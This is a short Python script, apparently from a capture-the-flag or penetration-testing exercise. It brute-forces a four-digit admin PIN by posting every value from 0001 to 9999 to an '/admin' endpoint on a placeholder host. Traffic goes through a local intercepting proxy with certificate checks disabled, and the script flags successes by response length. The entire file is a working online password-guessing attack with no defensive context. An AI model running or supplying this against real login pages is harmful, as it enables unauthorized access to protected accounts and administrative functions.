import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import urllib
import re

proxy = {
  'https': 'http://127.0.0.1:8080',
  'http': 'http://127.0.0.1:8080'
}

import sys
# r = int(sys.argv[1])
# print(f"{r*1000} to {r*1000+1001}")
# for n in range(r*1000, r*1000+1001):
for n in range(1, 9999+1):
    D = str(n).zfill(4)
    req = requests.post(f'https://files.SITE/admin', proxies=proxy, data=urllib.parse.urlencode(dict(pin=D)), verify=False, headers={
            "Content-Type": "application/x-www-form-urlencoded"
    })
    print(D, len(req.text), len(req.text) == 198, flush=True)